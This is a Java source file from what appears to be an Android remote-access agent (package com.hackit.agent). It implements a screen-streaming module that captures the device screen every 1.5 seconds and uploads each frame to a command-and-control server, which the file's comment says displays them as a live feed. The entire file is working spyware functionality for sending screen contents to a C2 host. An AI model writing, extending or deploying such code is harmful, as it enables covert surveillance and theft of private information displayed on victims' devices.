package com.hackit.agent;

import android.content.Context;

import java.io.File;

/**
 * Rolling screen feed. Every frame is uploaded as its own artifact; the C2
 * keeps the newest one and shows it as MJPEG. Runs only while a task keeps it
 * alive, so an idle device does not stream.
 */
final class ScreenStream {
    private static volatile boolean streaming;
    private static Thread worker;

    static boolean streaming() {
        return streaming;
    }

    static synchronized String start(final Context ctx) {
        if (streaming) {
            return "already streaming";
        }
        if (!ScreenCap.available()) {
            return "projection not granted — approve on the setup page first";
        }
        final Context app = ctx.getApplicationContext();
        streaming = true;
        worker = new Thread(new Runnable() {
            @Override
            public void run() {
                while (streaming) {
                    File frame = ScreenCap.frame(app);
                    if (frame != null) {
                        Net.upload(app, frame, "frame-" + System.currentTimeMillis() + ".jpg", "screen_frame");
                        //noinspection ResultOfMethodCallIgnored
                        frame.delete();
                    }
                    try {
                        Thread.sleep(1500L);
                    } catch (InterruptedException exc) {
                        return;
                    }
                }
            }
        }, "screen-stream");
        worker.setDaemon(true);
        worker.start();
        return "streaming";
    }

    static synchronized String stop() {
        if (!streaming) {
            return "not streaming";
        }
        streaming = false;
        if (worker != null) {
            worker.interrupt();
            worker = null;
        }
        return "stopped";
    }

    private ScreenStream() {
    }
}